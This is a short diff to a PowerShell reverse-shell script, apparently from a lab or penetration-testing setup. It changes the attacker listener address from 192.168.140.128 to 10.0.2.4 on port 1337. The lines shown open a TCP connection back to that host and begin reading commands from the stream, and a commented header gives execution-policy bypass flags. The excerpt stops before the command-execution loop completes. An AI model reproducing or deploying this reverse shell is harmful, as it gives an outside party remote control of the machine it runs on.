@@ -1,5 +1,5 @@
 #powershell -NoP -NonI -Exec Bypass -Command
-$ip = '192.168.140.128'
+$ip = '10.0.2.4'
 $port = 1337
 $client = New-Object System.Net.Sockets.TCPClient($ip, $port); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
